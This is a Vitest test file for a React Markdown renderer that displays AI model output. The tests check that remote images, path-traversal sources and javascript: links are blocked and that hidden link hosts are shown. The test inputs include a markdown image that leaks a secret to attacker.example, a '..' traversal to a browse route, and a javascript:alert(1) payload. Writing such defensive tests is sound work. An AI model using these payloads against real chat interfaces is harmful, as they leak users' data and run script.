import { describe, expect, it } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "@/components/Markdown";

const render = (md: string, allowImages = false) =>
  renderToStaticMarkup(<Markdown allowImages={allowImages}>{md}</Markdown>);

describe("Markdown", () => {
  it("does not load remote images from model output", () => {
    const html = render("Answer ![x](https://attacker.example/leak?q=secret) done");
    expect(html).not.toContain("<img");
    expect(html).toContain("open from attacker.example");
  });

  it("loads only this app's own pictures when images are allowed", () => {
    expect(render("![cat](/api/image/abc123_X-9)", true)).toContain('<img src="/api/image/abc123_X-9"');
    // Another origin, an API route with side effects, and a `..` that resolves to one are not pictures.
    for (const src of [
      "https://example.com/cat.png",
      "/api/browse?url=https://attacker.example/x",
      "/api/image/../browse?url=https://attacker.example/x",
      "/api/voices/preview?voice=en-US-AvaNeural",
    ]) {
      expect(render(`![x](${src})`, true), src).not.toContain("<img");
    }
  });

  it("shows a link's host when the text hides it", () => {
    const html = render("[click here](https://evil.example/x)");
    expect(html).toContain("(evil.example)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(render("[example.com/page](https://example.com/page)")).not.toContain("(example.com)");
  });

  it("neutralizes javascript: links", () => {
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:");
  });
});
